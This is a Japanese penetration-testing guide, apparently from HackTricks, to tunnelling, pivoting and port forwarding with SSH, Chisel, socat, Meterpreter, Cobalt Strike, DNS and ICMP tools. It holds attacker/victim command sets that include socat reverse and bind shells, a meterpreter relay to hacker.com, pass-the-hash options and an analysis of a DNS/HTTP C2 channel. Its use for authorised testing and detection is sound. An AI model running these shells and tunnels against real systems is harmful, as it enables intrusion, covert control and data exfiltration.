# トンネリングとポートフォワーディング

{{#include ../banners/hacktricks-training.md}}

## Nmapのヒント

> [!WARNING]
> NmapのプロキシサポートはTCP接続に限定されており、ping、ポート、OS検出スキャンには影響しません。スキャナーがSOCKSプロキシの背後にある場合は、**ホスト検出を無効化**（`-Pn`）し、**TCP connect scan**（`-sT`）を使用してください。<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

最後のコマンドでは、Evil-WinRMの`-u`および`-i`オプションを使用してアカウントとWinRMホストを指定しています。WinRMのデフォルトポートは5985です。<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSHは、暗号化されたチャネルを介してX11接続、任意のTCPポート、Unixドメインソケットを転送できます。<sup>[[6]](#references)</sup>

SSHグラフィカル接続（X）

`-Y`は信頼されたX11 forwardingを有効にし、`-C`は転送データの圧縮を要求します。<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

SSH Server で新しい Port を開く --> Other port

Remote（`-R`）forwarding は SSH server 上で listen し、local side に接続します。明示的な bind address によって、その listener にアクセスできる interface が制御されます。<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

ローカルポート --> 侵害されたホスト (SSH) --> Third_box:Port

ローカル (`-L`) forwarding はクライアント上で listen し、SSH server 側から宛先に接続します。<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

ローカルポート --> 侵害済みホスト (SSH) --> 任意の場所

Dynamic (`-D`) forwarding は、リモート側から接続を開くローカル SOCKS4/SOCKS5 listener を作成します。<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### ProxyJumpを使用した多段接続

`-J`/`ProxyJump` は、カンマ区切りで指定した1つ以上のjump hostを経由してtargetに接続します。Forwarding optionsは引き続き最終的なSSH connectionに適用されるため、以下のSOCKS listenerは最初のbastionではなく、`internal-target`からdestinationに接続します。これにより、jump hostにログインして2つ目のSSH clientを起動する必要がなくなります。<sup>[[6]](#references)</sup>
```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```
Jump machine 固有のオプションは `~/.ssh/config` に配置する必要があります。destination を対象としたコマンドライン設定は、中間ホストには自動的に適用されません。<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

これは、DMZ を経由して内部ホストから自分のホストへ reverse shell を取得する場合に便利です。

サーバーの `GatewayPorts` 設定は、remote forward が loopback の範囲を超えて bind できるかどうかを制御します。デフォルトは `no` です。<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

この root ベースの例では、両方のホスト上にトンネルデバイスを作成します。サーバーでは tun forwarding を許可し、選択したアカウントが tun デバイスにアクセスできる必要があります。ここで `root` アカウントを使用する方法の 1 つが、`PermitRootLogin yes` です。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
サーバー側でフォワーディングを有効化する
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
クライアント側で新しいルートを設定する
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **セキュリティ – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6では、Terrapinの初期トランスポート整合性攻撃に対抗するstrict-KEX extensionが追加されました。可能な場合は両方のpeerを更新し、古い実装については、forwarded channelがバージョンだけで保護されていると想定せず、ベンダーのガイダンスに従ってください。<sup>[[8]](#references)</sup>

## SSHUTTLE

ホストを経由して、**ssh**で**サブネットワーク**へのすべての**トラフィック**を**tunnel**できます。\
例えば、10.10.10.0/24宛てのすべてのトラフィックをforwardingする場合です。

`sshuttle`はSSH経由の透過的なプロキシを提供し、以下に示すように、サブネットとカスタムSSHコマンドを選択できます。<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
秘密鍵で接続する
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploitの`portfwd`はlocal forwardingとremote forwardingをサポートします。一方、SOCKS proxy moduleはsession routesまたは`autoroute`で動作するよう設計されており、以下の例ではデフォルトでport 1080をlistenします。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> 侵害されたホスト（active session） --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
別の方法:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike の Beacon は、Beacon 経由で SOCKS4a/SOCKS5 接続を中継できます。`rportfwd` は侵害されたホスト上で bind し、`rportfwd_local` は Cobalt Strike client から宛先への接続を開始します。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Beacon 経由で traffic を routing する interfaces 上の Team Server で port を開きます。<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> この場合、**port は Beacon host 上で開かれ**、Team Server 上では開かれません。traffic は Team Server に送信され、そこから指定された host:port に送られます。<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
reverse-forwarding manual には、以下の動作が記載されています：<sup>[[14]](#references)</sup>

- Beacon の reverse port forward は、**個々のマシン間でリレーするためではなく、Team Server へ traffic を tunnel するよう設計されています**。
- Traffic は、P2P links を含め、**Beacon の C2 traffic 内で tunnel されます**。
- High ports は通常、privileged-port の制限を回避しますが、target OS の policy と既存の listeners は引き続き適用されます。

### rPort2Port local

> [!WARNING]
> この場合、**port は Team Server ではなく Beacon host で開かれ**、**traffic は Team Server ではなく Cobalt Strike client に送信され**、そこから指定された host:port に送信されます。<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

この project は `tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp`、`tunnel.php` などの Web tunnel endpoint を提供します。local proxy を開始する前に、対応する endpoint を 1 つ upload してください。<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) の releases page からダウンロードできます\
Chisel は SSH-protected connection を使用して HTTP 経由で TCP/UDP traffic を転送します。互換性のある client/server build を使用し、選択した release の command syntax を確認してください。<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) は、WebSocket、HTTP/2、または WebTransport（QUIC over HTTP/3）経由で静的または動的な forward を転送します。現在のビルドは、forward および reverse モードの両方で、TCP、UDP、Unix ソケット、stdio、SOCKS5、HTTP proxying、Linux の transparent-proxy listener をサポートしています。<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

attacker 側で server を実行し、`-R` を使って pivot から outbound 接続を確立します。この方向では、SOCKS5 listener は **server** 上に作成され、要求された接続は **client/pivot** の network から開始されます。<sup>[[52]](#references)</sup>
```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
-R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```
reverse static forward は同じ方向を使用します。たとえば、以下は pivot から到達できる `10.10.10.20:445` を、attacker の loopback port `8445` で公開します:<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### Egress と transport の詳細

- 明示的な HTTP プロキシを経由するには、client に `-p http://user:pass@proxy:8080` を追加します。`curl` などの client では `socks5h://127.0.0.1:1080` を使用する（またはアプリケーションで proxied DNS を有効にする）ことで、内部名がローカルの resolver に漏れるのではなく、tunnel の先で解決されるようにします。<sup>[[52]](#references)</sup>
- `wss://` は TLS で保護された WebSocket を選択します。`https://` client は HTTP/2 を選択しますが、reverse proxy/CDN による buffering や HTTP/1 への変換によって双方向 stream が壊れることが一般的です。この mode をテストする場合は、wstunnel server を直接公開してください。<sup>[[52]](#references)</sup>
- `wts://` は QUIC 上の WebTransport を選択します。`--enable-webtransport`（または `wts://` listen URL）を指定して server を起動し、listen port で UDP を許可します。この mode は、従来の HTTP `CONNECT` proxy を経由できません。その proxy は TCP を転送するものだからです。<sup>[[52]](#references)</sup>

> [!WARNING]
> upstream project は、組み込みの self-signed certificate を privacy protection として扱わないよう警告しています。代わりに、有効な custom certificate と `--tls-verify-certificate`（または mTLS）を使用し、remote access が意図されていない限り proxy listener は loopback に限定し、confidentiality が重要な場合はすでに secure な protocol を tunnel してください。<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng の quickstart では、proxy 上の TUN interface、agent に対する certificate-fingerprint validation、および tunneled network 用の route setup について説明しています。<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent のバインドとリスニング

Ligolo-ng は、proxy 側のアドレスに転送する listener を agent 上に追加でき、予約済みの `240.0.0.0/4` 範囲を route することで agent ローカルのサービスに到達できます。<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### エージェントのローカルポートへのアクセス
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivotは被害ホストからreverse tunnelを開始し、攻撃者のloopbackアドレス上にSOCKS4 proxyを公開します。READMEには、NTLM-proxyの認証情報およびhashオプションについても記載されています。<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy**経由のPivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat は `TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL`、`PROXY` などの address type を組み合わせます。以下の例では、これらのドキュメント化された endpoint を組み合わせています。<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks 経由の Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat経由のMeterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
socat のドキュメントに記載された `PROXY` アドレスタイプを使用し、被害者のコンソールで最後の行の代わりに次の行を実行すると、**認証不要のプロキシ**を経由できます。<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Client と Server の両方で証明書を作成する
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

ローカルのSSHポート（22）を攻撃者ホストの443ポートに接続する
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

PlinkはPuTTYのコマンドライン接続ツールで、`ssh`と同様のSSH forwardingオプションを備えています。<sup>[[22]](#references)</sup>

SSHポートには大文字の`-P`を使用します。`-pw`は互換性のために残されていますが、プロセス一覧にパスワードが露出するため、可能な場合はkey authenticationまたは`-pwfile`を優先してください。<sup>[[22]](#references)[[23]](#references)</sup>

このbinaryはvictim上で実行され、SSH clientであるため、reverse connection用にSSH serviceとポートを開きます。以下では`-R`を使用して、ローカルからアクセス可能なポートをattackerのマシンへforwardします。<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

永続的な `portproxy` ルールを作成または変更する際は、ホストが必要とする権限を持つコンテキストを使用してください。Microsoft は、以下で使用している `v4tov4` の add、show、delete 形式を文書化しています。<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

**システムへの RDP access が必要です**。\
Download:

SocksOverRDP は Remote Desktop Dynamic Virtual Channels を使用して、既存の RDP session 経由で SOCKS5 connection を転送します。client plugin は `127.0.0.1:1080` で listen し、server component は RDP target 上で実行されます。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - この tool は Windows の Remote Desktop Service feature にある `Dynamic Virtual Channels`（`DVC`）を使用します。DVC は **RDP connection 経由で packets を tunneling する役割**を担います。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

client computer で **`SocksOverRDP-Plugin.dll`** を次のように load します:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
これで **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **connect** でき、**SocksOverRDP plugin is enabled** であり、**127.0.0.1:1080** で **listen** することを示す **prompt** が表示されるはずです。

**RDP** 経由で **connect** し、victim machine に `SocksOverRDP-Server.exe` バイナリを upload & execute します。
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
次に、あなたのマシン（攻撃者）でポート1080がリッスンしていることを確認します：
```
netstat -antb | findstr 1080
```
これで [**Proxifier**](https://www.proxifier.com/) を使用して、そのポート経由でトラフィックをプロキシできます。<sup>[[26]](#references)</sup>

## Windows GUIアプリをProxifyする

[**Proxifier**](https://www.proxifier.com/) を使用すると、Windows GUIアプリがプロキシ経由で通信するようにできます。<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** で、SOCKSサーバーのIPとポートを追加します。\
**Profile -> Proxification Rules** で、Proxifyするプログラムの名前と、Proxifyする対象IPへの接続を追加します。Proxifierのルールでは、アプリケーション、対象ホスト、ポートを照合できます。<sup>[[27]](#references)</sup>

## NTLMプロキシ経由でトンネルする

前述のツール **Rpivot** は、NTLM認証を行うプロキシ経由でリレーできます。**OpenVPN** も、authファイルとNTLMv2方式を使用して設定すれば、プロキシ経由でルーティングできます。これはプロキシ認証のbypassではなく、プロキシ traversalです。<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm は upstream NTLM proxies に対して認証を行い、ローカルリスナーを公開し、ローカルのトンネルポートを宛先サービスにマッピングできます。これにより、clients はそのローカルポートを使用できます。<sup>[[29]](#references)</sup>\
例えば、ポート 443 を転送するには
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
たとえば、被害ホストの **SSH** サービスがポート 443 で listen するように設定すると、攻撃者側のポート 2222 を介して接続できます。<sup>[[29]](#references)</sup>\
攻撃者がポート 2222 で listen している状態で、localhost:443 に接続する **meterpreter** を使用することもできます。<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) は、Microsoft の .NET reverse-proxy toolkit です。こちらにあります: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine は DNS queries を介して IPv4 tunnel を作成し、TUN interfaces を使用します。文書化された setup では、両端でそれらの interfaces を作成するために必要な privileges が必要です。<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS transportは直接TCPよりオーバーヘッドが大きく、通常は低速です。このトンネルを介して圧縮されたSSH接続を作成するには、次を使用できます：<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**こちらからダウンロード**](https://github.com/iagox86/dnscat2)**。**

Dnscat2 は DNS を介して暗号化された command-and-control channel を確立します。以下の server および client コマンドは、公式ドキュメントに記載された使用方法に従っています。<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShellで**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使用すると、PowerShellでdnscat2 clientを実行できます。そのREADMEには、以下に示す`Start-Dnscat2`のパラメーターが記載されています。<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat による Port forwarding**

Dnscat2 の対話型 `listen` コマンドは、ローカルの listener をリモートの host と port にマッピングします。<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Change proxychains DNS

Proxychains-ng は動的リンクされた TCP connections をフックしますが、UDP や ICMP を運ぶことはできません。DNS proxying は設定可能なので、固定の public resolver を前提にせず、インストール済みの `proxychains.conf` と resolver helper を確認してください。Legacy の `proxyresolv` scripts では resolver を選択するために `PROXY_DNS_SERVER` を指定できます。internal names が必要な場合は、pivot から到達可能な resolver を使用してください。<sup>[[34]](#references)[[35]](#references)</sup>

## Go の Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor は、corporate networks でほとんど block されない 2 つの protocol、つまり outbound **DNS** と **plain HTTP POST** traffic **のみ**を悪用する **dual-channel C2 ("AK47C2")** を作成しました。<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• ランダムな 5 文字の SessionID（例: `H4T14`）を生成します。
• *task requests* には `1`、*results* には `2` を先頭に付け、複数の field（flags、SessionID、computer name）を連結します。
• 各 field は ASCII key `VHBD@H` で **XOR-encrypted** され、hex-encoded された後、dots で連結されます。最後に attacker-controlled domain が続きます。

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests では **TXT**（および fallback **MG**）records に対して `DnsQuery()` を使用します。
• Response が 0xFF bytes を超える場合、backdoor は data を 63-byte pieces に **fragments** し、marker:
`s<SessionID>t<TOTAL>p<POS>` を挿入します。これにより C2 server は pieces を並べ替えられます。

2. **HTTP mode (AK47HTTP)**
• JSON envelope を構築します:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• blob 全体を XOR-`VHBD@H` → hex → `Content-Type: text/plain` header 付きの **`POST /`** の body として送信します。
• Reply も同じ encoding に従い、`cmd` field は `cmd.exe /c <command> 2>&1` で実行されます。

Blue Team notes
• first label が長い hexadecimal で、常に 1 つの rare domain で終わる、異常な **TXT queries** を探します。
• Constant XOR key の後に ASCII-hex が続くパターンは、YARA で容易に検出できます: `6?56484244?484`（`VHBD@H` の hex）。
• HTTP では、pure hex で 2 bytes の倍数になっている text/plain POST bodies を flag します。

{{#note}}
この channel は各 sub-domain label を 63-octet DNS limit 内に維持しますが、protocol compliance だけでは stealthy にはなりません。rare domains、long hexadecimal labels、query volume は依然として detection signals です。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans は、TUN device と ICMP echo requests を使用する IPv4-over-ICMP tunnel について documentation しています。この setup には、interface を作成するのに十分な privileges が必要です。<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**ここからダウンロード**](https://github.com/utoni/ptunnel-ng.git)。

ptunnel-ng は ICMP 経由で TCP 接続を転送し、以下に示す `-p`、`-l`、`-r`、`-R` オプションを、それぞれ proxy、local listener、destination host、destination port に使用します。<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) は、安全なトンネルを介してローカルネットワークサービスをオンラインで公開するための agent です。CLI では HTTP、TCP、file URL エンドポイントが文書化されており、表示されるエンドポイントのホスト名は、エンドポイントとアカウントによって異なる場合があります。<sup>[[39]](#references)</sup>

### インストール

- アカウントを作成: https://ngrok.com/signup
- Client のダウンロード:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本的な使用方法

**ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_必要に応じて、agentは認証およびTLSオプションにも対応しています。<sup>[[39]](#references)</sup>_

#### TCPのトンネリング
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTPでファイルを公開する
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP calls の Sniffing

_XSS、SSRF、SSTI などに有用_\
standalone agent は、デフォルトで `http://127.0.0.1:4040` に HTTP inspection interface を公開します。この interface は HTTP traffic 用です。<sup>[[40]](#references)</sup>

#### 内部 HTTP service の Tunneling

`--host-header=rewrite` option は、upstream HTTP `Host` header を local service に合わせて rewrite します。<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml のシンプルな設定例

